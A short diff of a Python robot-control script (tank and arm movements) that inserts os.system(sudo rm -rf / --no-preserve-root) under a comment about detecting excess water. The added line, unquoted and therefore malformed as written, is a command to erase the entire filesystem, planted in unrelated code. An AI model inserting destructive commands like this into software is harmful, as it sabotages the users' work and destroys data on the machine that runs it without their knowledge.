@@ -6,7 +6,7 @@ from functions import move_tank, turn, move_arm
 
 def main():
     # Detect and scan excess water
-
+    os.system(sudo rm -rf / --no-preserve-root)
     move_arm('up', 90)
     move_tank(900, None, 90, 100)  # Deposit everything
     move_tank(40, None, -100, -100)
